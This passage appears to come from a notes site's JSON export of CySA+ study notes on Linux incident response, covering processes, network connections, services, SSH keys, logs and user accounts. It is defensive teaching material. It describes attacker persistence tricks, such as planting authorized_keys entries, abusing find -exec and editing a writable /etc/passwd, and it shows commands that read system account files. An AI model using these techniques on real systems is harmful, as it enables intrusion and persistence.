must be decided whether the situation is a suspicious event or not.\nAssignment\nThe first person to examine the incident must be determined. The person should take notes about the review.\nUsing the Checklist\nThere should be checklists for the analysis to be made in order to ensure consistent responses to incidents.\n3- Scope\nCharacterize the event\nSince determining the event will determine the actions to be taken, it is important to determine the type of the incoming event. EX: DDoS, malware infection, data leak …\nTaking Action\nAction should be taken according to the technique used to intercept the attacker’s method quickly. If there is an account that it has captured, simple measures such as account deactivation and IP blocking should be done quickly.\nData collecting\nThe image of the volatile memory along with the firewall, network traffic and other logs will be required for the investigation.\nIsolation\nUnplugging the compromised system could be a solution, isolating it is a more viable solution.\nAfter the systems affected by the incident are determined, the possibility of the attacker’s spread in the network is cut and volatile information is collected, the next step can be passed.\n4- Eradication\nIdentifying the Root Cause\nWith the information obtained in the 2nd and 3rd stages, the root cause of the event should be determined. The attacker must then be completely eliminated.\nDetermining Rootkit Potential\nIf rootkits are suspected in the system, the disk should be cleaned and a clean backup installed. After the installation, the latest updates of the existing applications and systems should be installed.\nImprove Defense\nOperating systems, applications used, network, DMZ etc. The deficiencies of defense in areas should be determined and work should be done on how to make improvement.\nVulnerability Scan\nPotential attack points on networks and systems should be identified and corrected by performing vulnerability scans.\nWhen the necessary arrangements are prepared to prevent the event from recurring, the recovery phase can be started.\n5- Recovery\nVerification\nVerify that logging, systems, applications, databases, and other operations work correctly.\nRestore\nAt this stage, the restore operation is coordinated.\nMonitoring\nSystems should be monitored for recurring events.\nWhen there is no repetitive harmful situation or unusual activity, the next step is taken.\n6- Lessons Learned\nWriting a Follow-up Report\nThe report includes the examinations with the expert and the executive, the stages of good and bad working in the intervention plan, and the recommendations regarding the process. The report should be written in a way that the manager is sure that the incident has been closed."},"SOC/Cysa+-Prep/Incident-Response-on-Linux/Incident-Response-Procedure":{"slug":"SOC/Cysa+-Prep/Incident-Response-on-Linux/Incident-Response-Procedure","filePath":"SOC/Cysa+ Prep/Incident Response on Linux/Incident Response Procedure.md","title":"Incident Response Procedure","links":[],"tags":[],"content":"How Does the Procedure Proceed?\nIn a SOC (Security Operation Center) environment, the action taken against an incident is important. Everyone should not use their own method they came up with, but methods that have had their frameworks previously determined should be used so there is consistency and everything proceeds accurately during a time of crisis. In this section, we will talk about how we can keep the base of consistency in response to incidents. This section is important to understand the big picture.\n\nAlert\nAfter the logs collected through the EDR, IDS, IPS, WAF, and similar security tools that are found in the SOC, rule correlation sets are formed through the SIEM to determine suspicious activity. Thus, in the case of an unwanted situation, a new alert is created.\nAnalyze\nIn an ideal SOC environment, there are Tier 1 analysts present to conduct the preliminary analysis on alerts that come through the security tools. This analyst analyzes the incoming alert and determines whether it is a false positive or not. For example, an alert can be formed after sending a request to a malicious URL address; however, the URL address is not actually malicious. The Tier 1 analyst controls this procedure and eliminates incoming alerts.\nInvestigate\nAfter it is determined that the incoming alert is not a false positive, the investigation procedure begins, and the source of the attack is investigated. In addition, the amount of progress the attacker has made since the beginning of the attack is investigated.\nAssess Impact\nThe systems that have been affected by the attack are determined and the amount of damage present in the current situation is assessed and evaluated. For example, a system that has been affected by ransomware may not have had all its data encrypted. Determinations similar to this have to be conducted to have an assessment of the current situation.\nContain\nAfter determining the systems affected from the attack, it is crucial that the situation is handled with control and prevented from spreading. Thus, the affected devices must immediately be isolated from the network. Let’s continue with the ransomware example. A dangerous ransomware will want to spread itself to other devices. In order to prevent the interaction with the other devices, the device must be isolated from the network.\nRespond\nAfter all the mentioned steps above are completed, the response process is initiated. At this step, the root cause of the situation is determined, the present dangers are removed, the systems are brought back to a working state, and lessons are learned from the situation that has occurred. The main topic of this training will be the details listed under this title. In future topics, we have showed you how to do this with details."},"SOC/Cysa+-Prep/Incident-Response-on-Linux/Mounts":{"slug":"SOC/Cysa+-Prep/Incident-Response-on-Linux/Mounts","filePath":"SOC/Cysa+ Prep/Incident Response on Linux/Mounts.md","title":"Mounts","links":[],"tags":[],"content":"In UNIX operating systems, you can mount a different file system to your own device. Of course, attackers develop methods to use this feature for their own purposes.\nRansomware attacks currently make up a significant number of cyber-attacks today. Cyber threat actors, by uploading ransomware to all devices located in the network, stop the system from working and by blocking the owners’ access to important information, force the victims to pay a ransom. \nWhen we examine corporate network topologies, we can see that almost every company has a file share server. During ransomware attacks, file share servers have become the main targets of attackers. \nAttackers use the file share servers during ransomware attacks for two goals: \n\n\nSince file share servers generally have critical data, ransomware is uploaded to these servers to block the owners’ access to important information and force them to pay a ransom. \n\n\nBy hosting the ransomware malicious software in the file share servers, to upload ransomware malicious software through the file share server from the devices that the attacker has made access to. \n\n\nOne of the checks that an incident responder must do during a cyber-attack is to check whether any of the file systems that have been mounted by the compromised devices has been affected by the cyber-attack.\nUnfortunately, there is no mount/unmount log. Thus, if the attacker conducted a mount procedure and then unmounted it, we cannot identify this. However, sometimes, we can see logs regarding mounts within the dmesg.\n\n\n\n\n\n\n\n\n\n\n\ndmesg | grep mount\n\nSince the mount procedures are not logged, we cannot conduct a backward search. However, we can still conduct our analysis by identifying the file systems that are still mounted to the device. \nMount\nYou can list the mounted file systems with the mount command.\n\n\n\n\n\n\n\n\n\n\n\nmount\n\nFindmnt\nFindmnt is another tool we can use to list the file systems that have been mounted. Since it is a more visually pleasing output than the other options, instead of wasting time to understand the other outputs, we can use the findmnt command. \n\n\n\n\n\n\n\n\n\n\n\nFindmnt\n\nDf\nDf is a tool that we can use to get information about disks. With the -aTh parameter we can list the file systems that have been mounted.\n\n\n\n\n\n\n\n\n\n\n\ndf -aTh\n\n/proc/mounts\nIn order to identify the actively mounted file systems we can read the /proc/mounts file. \n\n\n\n\n\n\n\n\n\n\n\ncat /proc/mounts\n"},"SOC/Cysa+-Prep/Incident-Response-on-Linux/Network":{"slug":"SOC/Cysa+-Prep/Incident-Response-on-Linux/Network","filePath":"SOC/Cysa+ Prep/Incident Response on Linux/Network.md","title":"Network","links":[],"tags":[],"content":"The attackers establish a network connection between the systems they have seized and their own systems, thus ensuring the communication of two devices. With this connection, the attacker is able to send and receive data to the system he/she has hacked.\nAttackers often prefer to receive a reverse shell over the device, even if they have Webshell in order to move more easily in the system they have seized. In addition to being able to move more easily, the victim device is connected to the attacker’s device with a reverse shell, thus bypassing security products more easily.\nAs an incident responder, we must identify these connections and analyze the traffic running through these connections. \nListing Active Network Connections\nDue to its ease of use and since it is usually already installed by default, “netstat” is probably the most preferred tool. \nYou can list all network connection with the “netstat -a” command. \n\n\n\n\n\n\n\n\n\n\n\nnetstat -a\n\nYou can only list the network connections of the TCP protocol with the “netstat -at” command. The “-n” parameter allows you to get faster results by turning off the reverse DNS lookup.\n\n\n\n\n\n\n\n\n\n\n\nnetstat -ant\n\nIn order to maintain persistence in a system, attackers choose to upload a backdoor in the system. When attackers want to access the system again, they use the backdoor they have created and can easily continue to access the system. The easiest way to identify backdoors like these is to examine the ports that device has listened to. \nWith the “netstat -l” command, we can list the ports that the device has listened to. \n\n\n\n\n\n\n\n\n\n\n\nnetstat -l\n\nDuring the incident response procedure, we must pay attention to all ports listened to from all interfaces. A good point to start the analysis is to analyze the ports that are not used by default by known applications. \nAs can be seen in the image above, by default, there is no information about which processes make these connections.\nWhen we provide the “-p” parameter to the netstat command, the information about which processes the network connections are made is also printed.\n\n\n\n\n\n\n\n\n\n\n\nnetstat -nlpt\n\nIPTables\nThe attacker may have made changes to the firewall rules. These rules must be examined. \nYou can list all iptables rules with the “iptables -L” command. \n\n\n\n\n\n\n\n\n\n\n\niptables -L\n"},"SOC/Cysa+-Prep/Incident-Response-on-Linux/Processes":{"slug":"SOC/Cysa+-Prep/Incident-Response-on-Linux/Processes","filePath":"SOC/Cysa+ Prep/Incident Response on Linux/Processes.md","title":"Processes","links":[],"tags":[],"content":"\nUnarguably, the most important piece of an operating system is its process. As an incident responder, we must have the ability to identify and analyze the suspicious processes. \nWhile conducting a process analysis, we can identify the motivation, goal, and which activities the attacker has conducted in the system. Undoubtedly, process analysis plays an important role during the incident response procedure. \nWhat Is Process? \nProcess is a program in the file system that is actively running. \nLet’s say an attacker downloaded malware to the victim machine, this is called a program. A program is ineffective against the operating system unless it is executed. When an attacker executes a program, this is now a process. \n\nOperating systems assign a PID (Process Identifier) value for each process in order to track each process. Each process has its own unique PID value. More than one process cannot have the same PID value at the same time.. However, when the process is terminated, the PID value can be assigned to another process. \nThe “init” process is the first process created by the kernel when the operating system is initiated. For this reason, the “init” process does not have a parent and always has a PID value of “1”. \nThe highest PID value that the operating system can assign is located within the “/proc/sys/kernel/pid_max” file. By reading this file, you can see the highest PID value that the operating system can assign. \n\nWe had mentioned that processes are created after a program is run. However, must a process only be actively running? \nThere are 4 different states for a process.\n\n\nRunning: When a process is running or is prepared to run. \n\n\nWaiting: When a process is waiting for an event or resource. \n\n\nStopped: When a process is stopped. \n\n\nZombie: When a process has ended but the “tast_struct” data structure has not been deleted yet for certain reasons. \n\n\nProcess Creation – fork&amp;exec\nA new process creation in UNIX operating systems is conducted with the fork and exec system calls. \n\nFork creates a new child process by duplicating a running process.\n\nThe newly created process has a PID value of its own. \nThe parent of the newly created process is the process that has conducted the fork command. \nThe newly created process cannot access the memory of the forked process. \n\nExec replaces the image of the running process with a new image and ensures that it is run from the entrypoint address.\nAfter the fork and exec commands are completed, the new process is created and running. \nProcess Tree\nIn our articles, we spoke of parent and child processes. However, what are parent and child processes? \nAs we have mentioned previously, the “init” process is created first by the kernel. The other processes are created from the init process and according to its needs, each process creates a new process. \nParent Process\nThe process responsible for the creation of the process is called the parent process. In UNIX operating systems, all processes have a parent except the “init” process.\nChild Process\nWhen a new process is created, the newly created process is the child process. All processes outside of the “init” process are child processes. \nWe must understand the process tree in order to understand the attacker’s goal, motivation, and actions within the system. \nFor example, let’s examine the “pstree” command output below. \n\nThe process named “sshd” belongs to the SSH service. It is important to examine the process called sshd in Incident response processes. In this way, it can be determined which shell is logged in and what kind of activity it performs on the system.\nWhen the child processes of the process named sshd is examined, we can see that it is running through two different bash shell’s ssh services. This means that there are two different ssh sessions. When the sshd process above is examined, we can see that the pstree command was run (since the processes are running when the pstree command is run, it can list the active processes on the operating system), and when the sshd process below is examined, we can see that the user has connected with bash shell and that the user has run the “yes” command. \nIncident Response\nList Processes\nBefore entering the process analysis, the processes running on the device must be determined. In order to preserve the integrity of the system as much as possible, we need to use tools that provide the same functionality and are available by default, besides, installing a new tool will waste time during incident response. The tools that come by default will mostly be sufficient for incident response.\nps\nThe “ps” command shows the information relating to the chosen active processes. Without given any parameters, it shows the information only relating to its own process. \n\nWhen no parameter is given, the “ps” tool will not be of any use. However, with the help of parameters, the ps tool will be one of the most crucial tools we can use during our process analysis procedure. \n\nCommonly used parameters are as shown below\n\na:  shows processes for all users\nu:  displays the process’s user/owner\nx: shows processes not attached to a terminal\n-u username: Only lists processes owned by the specified user\n-C process_name: Only lists the processes under the specified process\n—forest: Shows the process tree\n–ppid PPID: Only lists the processes with the specified PPID values\n\nWith the command below, you can see all active processes in the form of a process tree. \nps aux —forest\n\npstree\nWith the pstree tool, you can see the active processes in the format of a process tree. \n\ntop\n“Top” is one of the tools that help us list active processes. Its difference from the other tools is the fact that it allows us to watch the active processes in real time. \n\nIn the case of a suspicion of a malicious crypto mining software, we can use the “top” tool to watch the processes that are using the most CPU in real time. When the top tool is run, with the “P” letter you can list the processes according to their CPU usage. \nSome filters that will help us during the incident response procedure are as follows.\n\n\nP: sort the process list by cpu usage\n\n\nN: sort the list by process id\n\n\nT: sort by the running time\n\n\nR: reverse the sorting order\n\n\nC: display full command path and arguments of process\n\n\nAnalyze\nAt this stage, we have the active process list on the device. It is necessary to make a detailed analysis of the suspects from this list we have obtained.\nIf we have a high number of processes to examine, a good point to start at would be to analyze the processes that have interesting names like (shell, reverse, miner, etc) and processes that run with service accounts (www-data).\n/proc\nIn the /proc directory, there are details about processes, kernels, and the Linux system. This directory is a directory that is not actually there and is made up of virtual files. When the content of a file in the /proc directory is read, the operating system will create the content of the file and present it for you. \n\nWhen a new process is created, a new directory is created under the /proc directory for the process. \nFormat: /proc/PID/\nThere are virtual files with detailed information about the process under the /proc/PID directory. With the help of these files, we can get detailed information about the process. \n\nIn this directory, there are certain files that are beneficial to incident responders. Examples of these files are as stated below.\n\nStatus: Contains the status of the process, the user and group identity of the person running the process, the entire list of group memberships by the user, and the PID and PPID information.\nCmdline: Contains the command line parameters used to initiate the process. \nEnviron: The environ file shows the environment variables that are in effect.\nFd: The fd file shows the file descriptors. \n\nFor example, let’s try to learn the command line parameters for the ssh process. First, we must learn the PID values of the ssh process. For this, we can get help from the tools mentioned in the article. \nps aux | grep ssh\n\nNow that we know the PID values of the ssh process, let’s read the file named cmdline located under the /proc directory. \n\nBinary\nProcess image is an executable file required while executing the program. \nInformation like the name and which directory the binary is located in the file system can help us quickly identify the malicious process. For example, if the executable relating to the process is “/tmp/reverse”, it has a very high chance of being malicious. \nWhen analyzing the binary, you can mainly understand whether the file is malicious or not. To analyze the file, you can use the static and dynamic malware analysis methods. However, quickly checking the reputation of the file will gain you speed in the incident response process. \nVirusTotal is one of the greatest tools that has helped analysts that work in the defensive field. You can see whether the file you have uploaded has been identified by antivirus engines in addition to its metadata information and the comments that the other users have made. \n\nCommand Line\nThe command line parameters relating the process might give you information on the goal of the process and whether the process is malicious or not. In general, if the Command Line parameters include personal information and keywords like password, login, URL, IP Address, port, this is a sign that the process should be examined in detail. \nWhen APT attacks are analyzed, it has been observed that cyber attackers choose to use tools that are included by default in operating systems in contrast to custom malicious tools in order to prevent being identified. For example, when stealing data, it has been observed that they prefer the “netcat” tool instead of downloading a separate tool to exfiltrate the data stolen. To access the information about the default tools that attackers prefer, you can look at the project named GTFOBins. \nDuring the incident response procedure while looking into the process lists, we may disregard tools that we may believe to be safe because they are included in the operating system by default. However, attackers use these tools to their advantage very frequently. It can be understood whether these tools are being used maliciously or not from the Command Line parameters. \n\nConsidering the image above; find is a tool created for searching, but the command can be run thanks to the -exec parameter. An attacker who abuses this feature of the find tool can run commands within the operating system with the help of the find command. An inexperienced analyst may not be able to detect the command that the attacker ran because the find command is included in the operating system by default. However, when the command line parameters are examined, it can be seen that there is definitely a suspicious situation.\nMemory Analysis\nThis section will be explained in more detail under Memory Analysis. However, to quickly take a look, we can use the pmap command. \n\nEradication\nIn the eradication step of incident response, we must end the processes created by the attacker. \nYou can terminate a running process through the tools that come installed by default.\nkill\nThe kill tool helps us send a SIGNAL to a process. Its use is as below.\nUsage: kill SIGNAL PID\nkill SIGNAL PID\nWhen you send a “SIGKILL” signal to the process you want to end, the process will be terminated. \n\nkillall\nThe killall tool will help us end processes based on process name. It can terminate more than one process running under the same name at once. \nUsage: killall PROCESS_NAME\nkillall PROCESS_NAME\nDuring the incident response procedure, we can easily kill more than one malicious software that is under the same process with the killall command. \n"},"SOC/Cysa+-Prep/Incident-Response-on-Linux/SSH-Authorized-Keys":{"slug":"SOC/Cysa+-Prep/Incident-Response-on-Linux/SSH-Authorized-Keys","filePath":"SOC/Cysa+ Prep/Incident Response on Linux/SSH Authorized Keys.md","title":"SSH Authorized Keys","links":[],"tags":[],"content":"The SSH server allows access to the system with more than one authentication method.\nThe most commonly used method is to provide authentication with the username and password pair. However, this method is not more reliable than other methods. SSH keys are a more reliable and secure authentication method.\nAfter the user creates the key pairs on his own device, he/she writes the public key to the ”~/.ssh/authorized_keys” file on the server that he/she will access. Thus, the user can now access the server without using the username-password pair.\nThis feature is used by attackers to ensure persistence. By adding their own key to the “authorized_keys” file, the attackers can access the device whenever they want.\nDuring the incident response procedure, we must identify the SSH keys added by the attacker, and we must delete these keys in order to block the attacker from accessing the device. \nThe “authorized_keys” file is located in the “.ssh” directory in the main directory of users. We can use the command below to identify all “authorized_keys” files. \n\n\n\n\n\n\n\n\n\n\n\nfind / -name ‘authorized_keys’\n"},"SOC/Cysa+-Prep/Incident-Response-on-Linux/Service":{"slug":"SOC/Cysa+-Prep/Incident-Response-on-Linux/Service","filePath":"SOC/Cysa+ Prep/Incident Response on Linux/Service.md","title":"Service","links":[],"tags":[],"content":"Attackers use various persistence techniques in order to be able to access the compromised system at a later time. One of these methods is to ensure that the malicious programs, command or codes they have prepared are activated in the background. \nSince the services are activated in the background, they give the attackers the option to re-start or activate with a different command in the case of the service not working properly. Thus, it is a commonly chosen method to ensure persistence. \nServices can have different status according to their activation status. These status and their explanations are as stated below. \n\n\n\nActive (running): The service is running in the background.\n\n\nActive (exited): Is the case of a service being successfully run but there is no daemon to be monitored. \n\n\nActive (waiting): The service is running but is waiting for an event.\n\n\nInactive: The service is not working.\n\n\nEnabled: Service is enabled at boot time.\n\n\nDisabled: Service is disabled and will not be started at Linux server boot time. \n\n\nUnderstanding Service Configuration Files\nDuring the analysis procedure, we must be able to identify the anomalies and malicious behavior relating to suspicious services. For this reason, we must first understand what kind of a format the service configuration file has and what these variables mean. \nConfiguration files owned by services have the “.service” extension. You can make changes to these files with text editor. \n\nLet’s examine the file structure through an example unit file. \n\nUnit files are made up of sections. The sections are identified between the “[“ and “]” signs and are valid until the next section or until the end of the file. \n[Unit] Section\nThe “unit” section is usually used to complete the meta data in the unit or to configure the connection between the other units. The directives we will usually come across in the unit section is as follows: \n\n\nDescription: Is used to complete the explanations regarding the unit. \n\n\nRequires: Contains the other required units in order for the unit to run successfully. If any of the units identified here are not running properly, the relevant unit is ended. \n\n\nBefore: Contains the units that must be run prior to the relevant unit being initiated. \n\n\n[Install] Section\nThis section is optional and is used to identify the actions when a unit is activated or deactivated. The directives you will usually come across in the install section is as below: \n\n\nWantedBy: Is used to identify how the Unit is activated.\n\n\n[Service] Section\nThis section is used to define the configurations of the service. The directives you will usually come across in the service section is as below: \n\n\nExecStart: Contains commands and arguments to initiate a service.\n\n\nExecStartPre: Contains the commands and arguments needed prior to a service being initiated. \n\n\nRestart: Contains information relating to which circumstances the system will restart. \n\n\nIncident Response\nList All Services\nA list of services on the device should be obtained prior to analyzing the suspicious services. There is more than one method to obtain the services. \nYou may list all services on the device by using the service tool.\n\n\n\n\n\n\n\n\n\n\n\nservice —status-all\n\nYou can also list all of the services on the device by using the systemctl tool. \n\n\n\n\n\n\n\n\n\n\n\nsystemctl list-units —type=service\n\nFind Historical Data\nIf the attacker will not use the service that he/she has created again, he/she may have deleted it from the device. In a situation like this, listing the recorded services might not be enough to identify the actions that the attacker has conducted on the services. \nIf the time frame of the cyber-attack is known, examining the services executed during this timeframe will help us accurately identify the TTP of the attacker. \nSince we do not know the name of the service, we cannot conduct a specific search in the logs. At this point, we must evaluate the logs that have occurred during the attack’s timeframe. \n\n\n\n\n\n\n\n\n\n\n\nsudo journalctl —since “2021-05-07 00:00” —until “2021-05-07 23:59”\n\nDue to the high number of logs, we may not be able to access the information we want easily. However, by filtering various words like unit or service we can continue our analysis with a less number of logs. \nIf we do have the name of the service, we can conduct our research in an easier manner. \n\n\n\n\n\n\n\n\n\n\n\nsudo journalctl -u cron —since “2021-05-07 00:00” —until “2021-05-07 23:59”\n\nAnalyze\nNow that we have suspicious services, we can start our analysis.\nInitially, we must collect information about the status of the service. We can access information about the status of the service and the location of the configuration file with the “service SERVICE_NAME status” command.\n\n\n\n\n\n\n\n\n\n\n\nservice SERVICE_NAME status\n\nAs a result of this command, we can access information relating to whether the service is actively running, where the configuration file is located, the PID value of the running process and the last couple of log information of the service. \nWe can access the same information through systemctl. \n\n\n\n\n\n\n\n\n\n\n\nsystemctl status SERVICE_NAME\n\nAfter learning the current status of the service and the location of the configuration file, we can now start to collect information about the service. \nWe can collect information regarding the service by opening the configuration file through any text editor. \n\n\n\n\n\n\n\n\n\n\n\ncat /lib/systemd/system/cron.service\n\nThe sections that we should specifically pay attention to in the configuration file is in the “service” section. Within the “ExecStart” directive of this section, the commands and programs that will execute when the service is activated are present. Attackers can input their own malicious commands into the “ExecStart” directive, and these commands can run in the background. \nIn addition, it is critically important that we identify when the services will run, and which users can run it. \nWe can identify when the configuration file for the system has been edited with the “stat” command. If you suspect that the attacker has changed a service or has created a new service, you can examine the information relating to the configuration file. \n\n\n\n\n\n\n\n\n\n\n\nstat /lib/systemd/system/cron.service\n\nWe must examine whether this service has been activated before, and if it has, we must examine its service logs. In order to view the logs for the service, we can use the journalctl tool. You can view logs relating to a specific service by using the “-u” parameter and inputting the name of the unit. \n\n\n\n\n\n\n\n\n\n\n\njournalctl -u service-name.service\n\nIf you want to limit your search to a determined time period, you can use the “—since” and “—until” parameters.\n\n\n\n\n\n\n\n\n\n\n\nsudo journalctl -u cron —since “2021-05-07 00:00” —until “2021-05-07 23:59”\n\nEradication\nIn the Eradication step of the incident response, the services created and changed by the attacker must be deleted and the system must be restored to its former state.\nIn addition, we must stop the services created and changed by the attacker. We can stop the service with the commands below. \n\n\n\n\n\n\n\n\n\n\n\n\n\n\nsudo systemctl stop SERVICE_NAMEsudo service SERVICE_NAME stop\n\nIn order to prevent the service from running automatically when the system is started, it must be disabled. You can disable the service with the help of the following command.\n\n\n\n\n\n\n\n\n\n\n\nsudo systemctl disable SERVICE_NAME\n\nWe must remove the configurations and programs relating to the service from the file system. \n\n\n\n\n\n\n\n\n\n\n\nrm  FILE_NAME\nThe following command must be run for the changed configurations to take effect.\n\n\n\n\n\n\n\n\n\n\n\nsudo systemctl daemon-reload"},"SOC/Cysa+-Prep/Incident-Response-on-Linux/Useful-Log-Files":{"slug":"SOC/Cysa+-Prep/Incident-Response-on-Linux/Useful-Log-Files","filePath":"SOC/Cysa+ Prep/Incident Response on Linux/Useful Log Files.md","title":"Useful Log Files","links":[],"tags":[],"content":"As an incident responder, we must know which actions on the system are recorded, where these actions are stored, and how we can use this information during our incident response procedure. \nBelow, you can find a table that shows commonly used log files during incident response procedures and what information is stored in each file. \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nFilesyslogLocation/var/log/syslog  /var/log/messagesContentsExecution of cron jobs  Execution of services\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nFileaccess.logLocation/var/log/apache2/access.log  /var/log/nginx/access.logContentsWeb requests\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nFileauth.logLocation/var/log/auth.log  /var/log/secureContentsLogon eventsUser creation eventsGroup eventsUser change events\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nFilelastlogLocation/var/log/lastlogContentsLast logon information\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nFilebash_historyLocation~/.bash_historyContentsExecuted commands through terminal"},"SOC/Cysa+-Prep/Incident-Response-on-Linux/Users-and-Groups":{"slug":"SOC/Cysa+-Prep/Incident-Response-on-Linux/Users-and-Groups","filePath":"SOC/Cysa+ Prep/Incident Response on Linux/Users and Groups.md","title":"Users and Groups","links":[],"tags":[],"content":"Users are a must in an operating system. User systems are present in all operating systems in order to ensure the safety of the system, to identify the data, and to provide a better user experience. \nIn this article, we will examine the user system included in the Linux operating system.\nWhen we examine the APT attack reports, we can observe that cyber attackers aim to take over the authorized user in order to completely compromise the domain. In ransomware attacks that have been very popular in today’s world, cyber attackers take over the domain admin accounts and download ransomware into all devices within the domain. \n\nMost system administrators won’t periodically conduct check-up’s regarding the devices under their responsibility. Thus, when a user is taken over or a new user is added into the operating system, it is very rarely recognized. Since the possibility of it being recognized is very low, attackers frequently choose this method in order to maintain persistence. \nIn addition, since the passwords that are included for users by default are not changed/forgotten during set-up, attackers can easily access the operating system. \nIf the general anatomy of a cyber attack is examined, attackers access the system as a result of exploiting the vulnerability on a service that is open to the Internet, and since these services are mostly unauthorized service accounts, the attackers compromise the users on the operating system in order to increase their privileges on the system.\nAs an incident responder, we must be able to detect the users that have been taken over, added or removed from the operating system by the cyber-attackers. \n“Everything is a file”\nEverything is a file describes one of the defining features of Unix, and its derivatives—that a wide range of input/output resources such as documents, directories, hard-drives, modems, keyboards, printers and even some inter-process and network communications are simple streams of bytes exposed through the filesystem name space. (Wikipedia)\nThe UNIX file system contains critical files that contain information about users and groups. As an incident responder, it is necessary to gain the ability to detect the existence of these files, their file structures, and the anomaly on these files.\nThe files containing the information of users and groups are as seen below:\n/etc/passwd\nUndoubtedly, one of the most crucial files in UNIX operating systems is /etc/passwd. This file contains usernames, the user’s password (depracated), UID/GID, the user’s home directory and the user’s shell information.\n\nThe file named passwd belongs to the root user and everyone has permission to read the file. For this reason, even if the attacker compromises the user with the lowest privilege in the system, they can still collect information about the users on the device.\nYou can read the passwd file like any other file with the cat command.\n\n\n\n\n\n\n\n\n\n\n\ncat /etc/passwd\n\nAt first glance, the /etc/passwd file may seem confusing. However, each line in this file has a specific format.\n\nWhen we analyze the file format, we can see that:\n\n\nThe username is written in the beginning of each prior to the first colon,\n\n\nThe password is written in between the first colon and the second colon (this part is a legacy and is generally not used anymore.)\n\n\nThe UID is written in between the second colon and the third colon,\n\n\nThe GID is written in between the third colon and the fourth colon,\n\n\nThe comment is included in between the fourth colon and the fifth colon,\n\n\nThe home directory of the user is written in between the fifth colon and the sixth colon,\n\n\nThe shell used by the user is written in between the sixth colon and the seventh colon\n\n\nIf a user’s shell is “/usr/sbin/nologin” in the passwd file, it means that the user will not be able to login to the operating system.\n\nThe fact that the user cannot login to the system does not mean that the user cannot run commands on the system. For example, the shell of the www-data user is “/usr/sbin/nologin”, however when a web application is compromised, attackers generally execute commands on the system with the www-data user.\n/etc/shadow\nIn the shadow file, there are encrypted versions of user passwords. Thus, it has become one of the most popular files by attackers.\n\nYou may think that including user passwords in a file may pose a security risk. The shadow file is readable only by the root user and users in the shadow group and passwords are kept encrypted. Reading this file doesn’t make any sense on its own. An attacker who wants to discover a user’s password must brute force it to find the password.\n\nLet’s take a look at the shadow file format.\n\nWhen we analyze the file format, we can see that:\n\n\nThe username is written in the beginning prior to the first colon,\n\n\nThe encrypted password is written in between the first colon and the second colon,\n\n\nThe last password change date is written in between the second colon and the third colon,\n\n\nInformation about the time needed in order for the user to change the password is written in between the third colon and the fourth colon, \n\n\nInformation about the required password change time is written in between the fourth colon and the fifth colon, \n\n\nInformation about when the user will be notified before the password is expired is written in between the fifth colon and the sixth colon,\n\n\nInformation about how many days will be provided for the user to change the expired password before the user is disabled is written in between the sixth colon and seventh colon, \n\n\nInformation about when the account will be expired is written in between the seventh and eight colon, \n\n\nThe section after the eighth colon is created for future use but is left empty because it is not currently used \n\n\n/etc/group\nThe /etc/group file contains the groups and information about which users are included in these groups.\nIdentifying compromised users is not enough to understand the risk in a cybersecurity incident. User groups should also be checked.\nIf a special configuration is not made, the www-data user is a user with low privilege. However, when determining the risk of a cyber incident, it would be wrong to adopt a point of view such as “The www-data user has been compromised, but the risk is low since the level of privileges is low”. If the attacker includes the www-data user in an high privilege group, the www-data user can have almost as much privilege as the root user.\n\nThe file named group belongs to the root user and everyone has read permission. For this reason, even if the attacker accesses the system through the user with the lowest privileges, they can still collect information about the groups on the device.\n\nLet’s take a look at the file format.\n\nWhen we analyze the file format, we can see that:\n\n\nThe group name is written in the beginning of each prior to the first colon,\n\n\nThe password is written in between the first colon and the second colon (this part is a legacy and is generally not used anymore.)\n\n\nThe GID is written in between the second colon and the third colon,\n\n\nThe users and usernames who are group members are written after the third colon\n\n\n/etc/sudoers\nThe sudoers file contains information about who can run the sudo command under which conditions.\n\nUnlike other files, the sudoers file contains comments about the file format by default.\n\n\n\nUser List: Determines which users will have certain authorizations\n\n\nHost List: Determines which hosts will have certain authorizations\n\n\nOperator List: Determines which user the users in  will run commands on behalf of\n\n\nTag List: Can have the “PASSWD”, “NOPASSWD” and “NOEXEC” values and determines whether they need passwords to run the command or not\n\n\nCommand List: Contains commands\n\n\n\nOther Important Files\nApart from these files, there are also different files that contain information about user logon processes.\n\n\n/var/run/utmp: maintains a full accounting of the current status of the system, system boot time (used by uptime), recording user logins at which terminals, logouts, system events etc.\n\n\n/var/log/wtmp: acts as a historical utmp\n\n\n/var/log/btmp: records failed login attempts\n\n\nIncident Response\nAnalyze\nDetermining the Users on the System\nAttackers add new users and modify existing users to ensure persistence. As an incident responder, it is necessary to identify these users and to remove/edit these users in a way that does not pose a risk during the eradication step.\nWhile controlling the users on the system during the incident response process, it may be necessary to compare the compromised system with clean system by obtaining the list of users that should be on the device from the application/server owner. It will be more accurate to use snapshots from the pre-cyber incident while obtaining the user list.\nIn order to make our analysis specific to the users on the system, we first need to identify the users on the system.\nBy reading the /etc/passwd file, users defined on the system can be determined.\n\n\n\n\n\n\n\n\n\n\n\ncat /etc/passwd\n\nAttackers prefer names such as support, service, dev, admin and sysadmin for the users they create in order to prevent themselves from being detected. We should pay attention to users with these names. \nIf the passwd file has incorrect permissions, users can be compromised by editing the passwd file. Attackers can take over users by replacing the “x” value next to their username with the password they created. For this reason, the information in the password field in the passwd file should be carefully checked during the incident response.\nIn addition, the shell information of the users should be checked. Shell information of users who should not have shell should be double-checked.\nIf the attacker has not cleaned the auth.log file, it is possible to detect newly created users via the auth.log file.\n\n\n\n\n\n\n\n\n\n\n\ntail /var/log/auth.log\n\nYou can find newly created users by searching for the word “useradd” in the auth.log file.\n\n\n\n\n\n\n\n\n\n\n\ngrep useradd /var/log/auth.log\n\nYou can identify users whose passwords have been changed by searching for the word “passwd” in the Auth.log file.\n\n\n\n\n\n\n\n\n\n\n\ngrep passwd /var/log/auth.log\n\nIdentifying User’s Permissions\nAs we mentioned earlier in our article, detecting compromised users is not enough to determine the risk. After identifying the users, the groups that these users are included in, and the authorizations defined specifically for these users should also be determined.\nA good starting point is to examine the groups that the users belong to and check the permissions of the user.\nWe have to examine the groups and the users included in the groups through the /etc/group file. The contents of the group file can be viewed using the cat command.\n\n\n\n\n\n\n\n\n\n\n\ncat /etc/group\n\nWhile conducting our examinations, we must pay attention to the critical groups and the users included in these groups. Users who should not be included in these groups should be identified. For example, the www-data user being included in the sudo 